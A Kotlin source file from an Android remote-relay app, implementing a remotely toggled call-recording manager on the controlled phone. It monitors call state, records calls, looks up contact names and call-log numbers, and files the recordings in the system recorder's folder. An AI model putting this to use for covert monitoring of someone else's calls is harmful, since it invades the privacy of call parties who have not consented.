package cn.ppps.forwarder.relay

import android.Manifest
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import androidx.core.content.ContextCompat
import cn.ppps.forwarder.utils.Log
import cn.ppps.forwarder.App
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * ★ 2026-08-11 通话录音管理器（被控端）
 *
 * 功能（由控制端"设置"窗口勾选"通话录音"远程开启/关闭）：
 * 1. 被动监听通话状态（TelephonyManager PhoneStateListener，需 READ_PHONE_STATE 权限）
 * 2. 通话接通（OFFHOOK）后对通话内容进行录音（MediaRecorder，source依次尝试
 *    VOICE_CALL → VOICE_COMMUNICATION → VOICE_RECOGNITION → MIC，多数设备受系统限制）
 * 3. 通话结束（IDLE）后：
 *    - 优先以通讯录中的名称为文件名 + 时间；不在通讯录则以电话号码 + 时间
 *    - 文件名标注呼入/呼出（如 张三_20260811_213000_呼入.m4a）
 *    - ★ 2026-08-13 保存到手机自带录音APP的相同目录（MIUI: MIUI/sound_recorder/call_rec），
 *      未检测到系统目录时回退 MediaStore Music/Recordings/CallRecord
 */
object CallRecordManager {
    private const val TAG = "CallRecord"

    /** 录音临时目录（app私有，避免权限问题，完成后复制到公共录音文件夹） */
    private const val TMP_DIR = "call_record_tmp"

    @Volatile private var listening = false
    @Volatile private var wasRinging = false
    @Volatile private var callNumber = ""        // 本次通话号码（呼入/呼出）
    @Volatile private var callDirection = ""     // "呼入" / "呼出"

    @Volatile private var recorder: MediaRecorder? = null
    @Volatile private var tmpFile: File? = null
    private val recorderLock = Any()

    private var telephonyManager: TelephonyManager? = null
    /** ★ PhoneStateListener 必须带 Looper 创建（无参构造内部 new Handler(Looper.myLooper())，
     *  在无 Looper 的线程（命令处理线程池）创建会 NPE 崩溃），故在主线程创建并注册 */
    private var phoneStateListener: PhoneStateListener? = null

    private fun createListener(): PhoneStateListener {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // ★ PhoneStateListener(Executor) 保证回调在主线程，避免无Looper线程NPE
            object : PhoneStateListener(androidx.core.content.ContextCompat.getMainExecutor(App.context)) {
                @Suppress("DEPRECATION")
                override fun onCallStateChanged(state: Int, incomingNumber: String?) {
                    handleCallState(state, incomingNumber)
                }
            }
        } else {
            @Suppress("DEPRECATION")
            object : PhoneStateListener() {
                @Suppress("DEPRECATION")
                override fun onCallStateChanged(state: Int, incomingNumber: String?) {
                    handleCallState(state, incomingNumber)
                }
            }
        }
    }

    @Suppress("DEPRECATION")
    private fun handleCallState(state: Int, incomingNumber: String?) {
        try {
            when (state) {
                TelephonyManager.CALL_STATE_IDLE -> {
                    // ★ 通话结束：停止录音并保存（命名/方向已确定）
                    if (wasRinging || callDirection.isNotEmpty() || recorder != null) {
                        Log.i(TAG, "通话状态→空闲，停止录音并保存")
                    }
                    wasRinging = false
                    stopRecordingAndSave()
                }
                TelephonyManager.CALL_STATE_RINGING -> {
                    // ★ 呼入响铃：记录呼入方向与号码（API 31+ incomingNumber 被屏蔽，查CallLog补充）
                    wasRinging = true
                    callDirection = "呼入"
                    callNumber = incomingNumber?.takeIf { !it.isNullOrEmpty() && it != "0" && it != "-1" } ?: ""
                    if (callNumber.isEmpty()) {
                        callNumber = queryCallLogNumber(CallLog.Calls.INCOMING_TYPE)
                    }
                    Log.i(TAG, "通话状态→响铃（呼入），号码=$callNumber")
                }
                TelephonyManager.CALL_STATE_OFFHOOK -> {
                    // ★ 通话接通：呼入（之前响铃）开始录音；呼出（未响铃）查询号码后录音
                    if (!wasRinging) {
                        callDirection = "呼出"
                        // 呼出号码 CallLog 可能延迟写入，先立即查，再用延迟任务补充
                        callNumber = queryCallLogNumber(CallLog.Calls.OUTGOING_TYPE)
                        // 1.5秒后再次查询补充（CallLog写入延迟）
                        Thread {
                            try {
                                Thread.sleep(1500)
                            } catch (_: InterruptedException) {}
                            if (callDirection == "呼出" && (callNumber.isEmpty() || callNumber == "未知号码")) {
                                val n = queryCallLogNumber(CallLog.Calls.OUTGOING_TYPE)
                                if (n.isNotEmpty() && n != "未知号码") callNumber = n
                            }
                        }.start()
                    }
                    Log.i(TAG, "通话状态→通话中（$callDirection），号码=$callNumber，开始录音")
                    startRecording()
                }
            }
        } catch (t: Throwable) {
            Log.e(TAG, "通话状态处理异常: ${t.message}")
        }
    }

    /**
     * 启动通话状态监听（无权限或已监听则跳过）
     * 由 RelayServerService 启动时调用，且仅在 RelaySettings.callRecord=true 时执行
     * ★ 创建 PhoneStateListener 与注册必须在主线程（listener 内部依赖 Looper）
     */
    fun start(context: Context) {
        if (listening) return
        val ctx = context.applicationContext
        // 权限检查：READ_PHONE_STATE（监听通话状态）+ RECORD_AUDIO（录音）
        val hasPhone = try {
            ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
        } catch (_: Throwable) { false }
        val hasAudio = try {
            ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
        } catch (_: Throwable) { false }
        if (!hasPhone || !hasAudio) {
            Log.w(TAG, "通话录音未启动：权限不足 phone=$hasPhone audio=$hasAudio（需 READ_PHONE_STATE + RECORD_AUDIO）")
            return
        }
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            if (listening) return@post
            try {
                val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager ?: return@post
                telephonyManager = tm
                val listener = createListener()
                phoneStateListener = listener
                tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE)
                listening = true
                Log.i(TAG, "★ 通话录音监听已启动（通话接通后自动录音）")
            } catch (t: Throwable) {
                Log.e(TAG, "启动通话状态监听失败: ${t.message}")
            }
        }
    }

    /** 停止通话状态监听并停止录音（由 RelayServerService 停止时调用） */
    fun stop() {
        if (!listening && recorder == null) return
        listening = false
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            try {
                telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
            } catch (_: Throwable) {}
            telephonyManager = null
            phoneStateListener = null
        }
        stopRecordingAndSave()
        Log.i(TAG, "通话录音监听已停止")
    }

    // ==================== 录音 ====================

    /** 启动录音：写入app私有临时文件，通话结束后复制到公共录音文件夹并命名 */
    private fun startRecording() {
        synchronized(recorderLock) {
            if (recorder != null) return  // 已在录音
            val ctx = App.context
            val dir = File(ctx.filesDir, TMP_DIR)
            if (!dir.exists()) dir.mkdirs()
            val file = File(dir, "call_tmp_${System.currentTimeMillis()}.m4a")
            var started = false
            var chosenSource = -1
            // source依次尝试：VOICE_CALL(双向，需系统权限) → VOICE_COMMUNICATION → VOICE_RECOGNITION → MIC
            val sources = intArrayOf(
                MediaRecorder.AudioSource.VOICE_CALL,
                MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                MediaRecorder.AudioSource.VOICE_RECOGNITION,
                MediaRecorder.AudioSource.MIC,
            )
            for (source in sources) {
                val rec: MediaRecorder = try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        MediaRecorder(ctx)
                    } else {
                        @Suppress("DEPRECATION")
                        MediaRecorder()
                    }
                } catch (t: Throwable) {
                    Log.w(TAG, "创建MediaRecorder失败: ${t.message}")
                    continue
                }
                try {
                    rec.setAudioSource(source)
                    rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    rec.setAudioEncodingBitRate(128000)
                    rec.setAudioSamplingRate(44100)
                    rec.setOutputFile(file.absolutePath)
                    rec.prepare()
                    rec.start()
                    recorder = rec
                    tmpFile = file
                    chosenSource = source
                    started = true
                    break
                } catch (e: Exception) {
                    Log.w(TAG, "录音source=$source 不可用: ${e.message}")
                    try { rec.release() } catch (_: Throwable) {}
                }
            }
            if (!started) {
                Log.e(TAG, "通话录音启动失败：所有音频源均不可用（设备限制）")
                try { if (file.exists()) file.delete() } catch (_: Throwable) {}
                return
            }
            Log.i(TAG, "★ 通话录音已开始 source=$chosenSource → ${file.absolutePath}")
        }
    }

    /** 停止录音并保存：命名（联系人/号码_时间_呼入/呼出）并复制到公共录音文件夹 */
    private fun stopRecordingAndSave() {
        var r: MediaRecorder? = null
        var file: File? = null
        synchronized(recorderLock) {
            r = recorder
            file = tmpFile
            recorder = null
            tmpFile = null
        }
        if (r == null && file == null) return
        try {
            // 先停止并释放 MediaRecorder（确保文件完整）
            val rec = r
            if (rec != null) {
                try { rec.stop() } catch (_: Throwable) {}
                try { rec.release() } catch (_: Throwable) {}
            }
            val f = file ?: return
            if (!f.exists() || f.length() < 1024) {
                Log.w(TAG, "录音文件为空或过小，丢弃: ${f.absolutePath}")
                try { f.delete() } catch (_: Throwable) {}
                return
            }
            // ★ 确定最终文件名：联系人名称/号码 + 时间 + 呼入/呼出
            val direction = callDirection.ifEmpty { "通话" }
            val number = callNumber.ifEmpty { "未知号码" }
            val name = lookupContactName(number)
            val time = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val fileName = "${name}_${time}_${direction}.m4a"
            Log.i(TAG, "★ 通话结束，保存录音: $fileName (时长文件=${f.length()}字节, 号码=$number, 方向=$direction)")
            saveToRecordings(f, fileName)
        } catch (t: Throwable) {
            Log.e(TAG, "停止/保存录音异常: ${t.message}")
        } finally {
            // 清理临时文件
            try { file?.delete() } catch (_: Throwable) {}
            callDirection = ""
            callNumber = ""
        }
    }

    /** 复制到录音目录：★ 2026-08-13 优先写入手机自带录音APP的相同目录，失败/未检测到再回退MediaStore/公共目录 */
    private fun saveToRecordings(src: File, fileName: String) {
        val ctx = App.context
        // ★★★ 2026-08-13 需求：保存目录与手机自带录音APP目录相同。
        //   优先检测系统录音APP已有的通话录音目录（红米/MIUI: /storage/emulated/0/MIUI/sound_recorder/call_rec）
        val sysDir = findSystemCallRecordDir()
        if (sysDir != null) {
            try {
                val dir = File(sysDir)
                if (!dir.exists()) dir.mkdirs()
                if (dir.canWrite()) {
                    val dst = File(dir, fileName)
                    FileInputStream(src).use { inp -> FileOutputStream(dst).use { out -> inp.copyTo(out) } }
                    Log.i(TAG, "录音已保存到系统录音APP目录: ${dst.absolutePath}")
                    // 通知媒体库扫描，确保系统录音APP/文件管理器能立刻看到
                    try {
                        ctx.sendBroadcast(Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, Uri.fromFile(dst)))
                    } catch (_: Throwable) {}
                    return
                }
                Log.w(TAG, "系统录音目录不可写($sysDir)，回退MediaStore保存")
            } catch (t: Throwable) {
                Log.w(TAG, "写入系统录音目录失败($sysDir)，回退MediaStore: ${t.message}")
            }
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val values = ContentValues().apply {
                    put(MediaStore.Audio.Media.DISPLAY_NAME, fileName)
                    put(MediaStore.Audio.Media.MIME_TYPE, "audio/mp4")
                    put(MediaStore.Audio.Media.RELATIVE_PATH, "${android.os.Environment.DIRECTORY_MUSIC}/Recordings/CallRecord")
                    put(MediaStore.Audio.Media.IS_PENDING, 0)
                }
                val uri: Uri? = ctx.contentResolver.insert(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, values)
                if (uri == null) {
                    Log.w(TAG, "MediaStore插入失败，回退私有目录")
                    keepInPrivate(src, fileName)
                    return
                }
                ctx.contentResolver.openOutputStream(uri)?.use { out ->
                    FileInputStream(src).use { inp -> inp.copyTo(out) }
                }
                Log.i(TAG, "录音已保存到媒体库: Music/Recordings/CallRecord/$fileName")
            } else {
                @Suppress("DEPRECATION")
                val dir = File(android.os.Environment.getExternalStoragePublicDirectory(
                    android.os.Environment.DIRECTORY_MUSIC), "Recordings/CallRecord")
                if (!dir.exists()) dir.mkdirs()
                if (!dir.canWrite()) {
                    Log.w(TAG, "外部存储不可写，回退私有目录")
                    keepInPrivate(src, fileName)
                    return
                }
                val dst = File(dir, fileName)
                FileInputStream(src).use { inp -> FileOutputStream(dst).use { out -> inp.copyTo(out) } }
                Log.i(TAG, "录音已保存: ${dst.absolutePath}")
            }
        } catch (t: Throwable) {
            Log.e(TAG, "保存录音到公共目录失败: ${t.message}，保留在私有目录")
            keepInPrivate(src, fileName)
        }
    }

    /**
     * ★★★ 2026-08-13 查找手机自带录音APP的通话录音目录（保证保存目录与自带录音APP一致）
     * 查找顺序：
     * 1. 扫描媒体库中已存在的路径含 call_rec 的音频 → 直接复用其所在目录（最准确，任何品牌适用）
     * 2. 小米/红米(MIUI) → 系统录音机固定目录 /storage/emulated/0/MIUI/sound_recorder/call_rec
     * 3. 其他品牌 → 返回null（走MediaStore回退）
     */
    private fun findSystemCallRecordDir(): String? {
        // 1. 优先复用系统录音APP已有通话录音所在目录
        try {
            val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                MediaStore.Audio.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
            } else {
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
            }
            val cursor = App.context.contentResolver.query(
                uri,
                arrayOf(MediaStore.Audio.Media.DATA),
                "${MediaStore.Audio.Media.DATA} LIKE ?",
                arrayOf("%/call_rec/%"),
                "${MediaStore.Audio.Media.DATE_MODIFIED} DESC")
            if (cursor != null) {
                try {
                    if (cursor.moveToFirst()) {
                        val data = cursor.getString(0)
                        if (!data.isNullOrEmpty()) {
                            val dir = File(data).parent
                            if (dir != null && dir.contains("call_rec", ignoreCase = true)) {
                                Log.i(TAG, "检测到系统录音APP已有录音目录: $dir")
                                return dir
                            }
                        }
                    }
                } finally {
                    cursor.close()
                }
            }
        } catch (t: Throwable) {
            Log.w(TAG, "扫描媒体库系统录音目录失败: ${t.message}")
        }
        // 2. 品牌默认：小米/红米(MIUI) 录音机通话录音目录
        val brand = (Build.MANUFACTURER + " " + Build.BRAND).lowercase(Locale.ROOT)
        if (brand.contains("xiaomi") || brand.contains("redmi") || brand.contains("mi ")) {
            val dir = "/storage/emulated/0/MIUI/sound_recorder/call_rec"
            Log.i(TAG, "小米/红米设备默认系统录音目录: $dir")
            return dir
        }
        return null
    }

    /** 保存失败时的兜底：保留在app私有目录（后续可从文件系统下载） */
    private fun keepInPrivate(src: File, fileName: String) {
        try {
            val dir = File(App.context.getExternalFilesDir(null), "CallRecord")
            if (!dir.exists()) dir.mkdirs()
            val dst = File(dir, fileName)
            FileInputStream(src).use { inp -> FileOutputStream(dst).use { out -> inp.copyTo(out) } }
            Log.i(TAG, "录音已保存到私有目录: ${dst.absolutePath}")
        } catch (t: Throwable) {
            Log.e(TAG, "私有目录保存也失败: ${t.message}")
        }
    }

    // ==================== 辅助 ====================

    /** 按号码查通讯录名称；不在通讯录返回号码本身 */
    private fun lookupContactName(number: String): String {
        if (number.isEmpty() || number == "未知号码") return "未知号码"
        return try {
            val uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number))
            val cursor = App.context.contentResolver.query(
                uri, arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME), null, null, null)
            if (cursor != null && cursor.moveToFirst()) {
                val name = cursor.getString(0)
                cursor.close()
                if (!name.isNullOrBlank()) name else number
            } else {
                cursor?.close()
                number
            }
        } catch (t: Throwable) {
            Log.w(TAG, "查询联系人名称失败: ${t.message}")
            number
        }
    }

    /** 从CallLog查询最近一条指定类型（呼入/呼出）的号码 */
    private fun queryCallLogNumber(type: Int): String {
        return try {
            val projection = arrayOf(CallLog.Calls.NUMBER)
            val selection = "${CallLog.Calls.TYPE}=?"
            val selectionArgs = arrayOf(type.toString())
            // ★ 2026-08-13 修复：CallLog provider不支持sortOrder中的"LIMIT 1"（报 Invalid token LIMIT 导致号码查不到→文件名"未知号码"）。
            //   moveToFirst()本身只取第一行（按DATE DESC最新一条），无需LIMIT。
            val cursor = App.context.contentResolver.query(
                CallLog.Calls.CONTENT_URI, projection, selection, selectionArgs,
                "${CallLog.Calls.DATE} DESC")
            if (cursor != null && cursor.moveToFirst()) {
                val n = cursor.getString(0) ?: ""
                cursor.close()
                n.takeIf { it.isNotEmpty() } ?: ""
            } else {
                cursor?.close()
                ""
            }
        } catch (t: Throwable) {
            Log.w(TAG, "查询CallLog失败: ${t.message}")
            ""
        }
    }
}
